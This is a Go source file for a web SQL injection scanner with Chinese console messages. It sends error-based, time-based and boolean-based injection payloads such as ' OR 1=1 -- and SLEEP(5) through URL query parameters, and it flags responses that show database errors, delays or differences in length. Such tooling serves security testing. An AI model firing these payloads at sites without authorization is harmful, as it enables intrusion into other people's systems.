package scan

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type SQLiScanner struct {
	target     string
	results    []SQLiResult
	httpClient *http.Client
}

type SQLiResult struct {
	URL       string
	Parameter string
	Type      string
	Payload   string
	Evidence  string
	Severity  string
	Confirmed bool
}

type responseSnapshot struct {
	body       string
	statusCode int
	duration   time.Duration
}

func NewSQLiScanner(target string) *SQLiScanner {
	return &SQLiScanner{
		target:  target,
		results: []SQLiResult{},
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (ss *SQLiScanner) Scan() ([]SQLiResult, error) {
	fmt.Println("🔍 开始SQL注入检测...")

	ss.testErrorBased()
	ss.testTimeBased()
	ss.testBooleanBased()

	fmt.Printf("✅ SQL注入检测完成，发现 %d 个漏洞\n", len(ss.results))
	return ss.results, nil
}

func (ss *SQLiScanner) testErrorBased() {
	errorPayloads := []string{
		"'",
		"''",
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' OR '1'='1' /*",
		"' OR 1=1",
		"' OR 1=1 --",
		"' OR 1=1 /*",
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' AND 1=1 --",
		"' AND 1=2 --",
	}

	errorPatterns := []string{
		"sql syntax",
		"mysql_fetch",
		"mysql_num_rows",
		"ora-",
		"oracle error",
		"microsoft ole db provider",
		"odbc sql server driver",
		"sqlserver jdbc driver",
		"postgresql query failed",
		"pg_query",
		"sqlite_query",
		"sqlite/jdbcdriver",
		"system.data.sqlite",
	}

	parsedURL, err := url.Parse(ss.target)
	if err != nil {
		return
	}

	baseline, err := ss.fetchSnapshot(ss.target)
	if err != nil {
		return
	}
	baselineLower := strings.ToLower(baseline.body)

	query := parsedURL.Query()
	for param := range query {
		for _, payload := range errorPayloads {
			testURL := replaceQueryParam(ss.target, param, query.Get(param), payload)
			snapshot, err := ss.fetchSnapshot(testURL)
			if err != nil {
				continue
			}

			bodyLower := strings.ToLower(snapshot.body)
			for _, pattern := range errorPatterns {
				if strings.Contains(bodyLower, pattern) && !strings.Contains(baselineLower, pattern) {
					result := SQLiResult{
						URL:       testURL,
						Parameter: param,
						Type:      "Error-based SQL Injection",
						Payload:   payload,
						Evidence:  pattern,
						Severity:  "High",
						Confirmed: true,
					}
					ss.results = append(ss.results, result)
					fmt.Printf("⚠️  发现SQL注入: %s (参数: %s)\n", testURL, param)
					return
				}
			}
		}
	}
}

func (ss *SQLiScanner) testTimeBased() {
	timePayloads := []struct {
		Payload string
		Delay   time.Duration
	}{
		{"' AND SLEEP(5) --", 5 * time.Second},
		{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", 5 * time.Second},
		{"'; WAITFOR DELAY '0:0:5' --", 5 * time.Second},
		{"' AND pg_sleep(5) --", 5 * time.Second},
	}

	parsedURL, err := url.Parse(ss.target)
	if err != nil {
		return
	}

	baseline, err := ss.fetchSnapshot(ss.target)
	if err != nil {
		return
	}

	query := parsedURL.Query()
	for param := range query {
		for _, tp := range timePayloads {
			testURL := replaceQueryParam(ss.target, param, query.Get(param), tp.Payload)
			snapshot, err := ss.fetchSnapshot(testURL)
			if err != nil {
				continue
			}

			delta := snapshot.duration - baseline.duration
			if delta < 4*time.Second {
				continue
			}

			confirmSnapshot, err := ss.fetchSnapshot(testURL)
			if err != nil {
				continue
			}
			confirmDelta := confirmSnapshot.duration - baseline.duration
			if confirmDelta < 4*time.Second {
				continue
			}

			result := SQLiResult{
				URL:       testURL,
				Parameter: param,
				Type:      "Time-based SQL Injection",
				Payload:   tp.Payload,
				Evidence:  fmt.Sprintf("响应时间差: %v", delta),
				Severity:  "High",
				Confirmed: true,
			}
			ss.results = append(ss.results, result)
			fmt.Printf("⚠️  发现SQL注入: %s (参数: %s)\n", testURL, param)
			return
		}
	}
}

func (ss *SQLiScanner) testBooleanBased() {
	boolPayloads := []struct {
		True  string
		False string
	}{
		{"' AND '1'='1", "' AND '1'='2"},
		{"' OR '1'='1", "' OR '1'='2"},
	}

	parsedURL, err := url.Parse(ss.target)
	if err != nil {
		return
	}

	baseline, err := ss.fetchSnapshot(ss.target)
	if err != nil {
		return
	}

	query := parsedURL.Query()
	for param := range query {
		for _, bp := range boolPayloads {
			trueURL := replaceQueryParam(ss.target, param, query.Get(param), bp.True)
			falseURL := replaceQueryParam(ss.target, param, query.Get(param), bp.False)

			trueSnapshot, err := ss.fetchSnapshot(trueURL)
			if err != nil {
				continue
			}
			falseSnapshot, err := ss.fetchSnapshot(falseURL)
			if err != nil {
				continue
			}

			trueDelta := absInt(len(trueSnapshot.body) - len(baseline.body))
			falseDelta := absInt(len(falseSnapshot.body) - len(baseline.body))
			if baseline.statusCode != trueSnapshot.statusCode || baseline.statusCode != falseSnapshot.statusCode {
				continue
			}
			if trueDelta > 10 {
				continue
			}
			if falseDelta < 30 || absInt(len(trueSnapshot.body)-len(falseSnapshot.body)) < 30 {
				continue
			}

			result := SQLiResult{
				URL:       trueURL,
				Parameter: param,
				Type:      "Boolean-based SQL Injection",
				Payload:   bp.True,
				Evidence:  fmt.Sprintf("Baseline响应长度: %d, True响应长度: %d, False响应长度: %d", len(baseline.body), len(trueSnapshot.body), len(falseSnapshot.body)),
				Severity:  "High",
				Confirmed: true,
			}
			ss.results = append(ss.results, result)
			fmt.Printf("⚠️  发现SQL注入: %s (参数: %s)\n", trueURL, param)
			return
		}
	}
}

func (ss *SQLiScanner) fetchSnapshot(target string) (responseSnapshot, error) {
	start := time.Now()
	resp, err := ss.httpClient.Get(target)
	if err != nil {
		return responseSnapshot{}, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return responseSnapshot{}, err
	}

	return responseSnapshot{
		body:       string(body),
		statusCode: resp.StatusCode,
		duration:   time.Since(start),
	}, nil
}

func replaceQueryParam(target, param, originalValue, payload string) string {
	if !strings.Contains(target, "?") {
		return target
	}
	return strings.Replace(target, param+"="+originalValue, param+"="+url.QueryEscape(payload), 1)
}

func absInt(value int) int {
	if value < 0 {
		return -value
	}
	return value
}

func (ss *SQLiScanner) GetResults() []SQLiResult {
	return ss.results
}
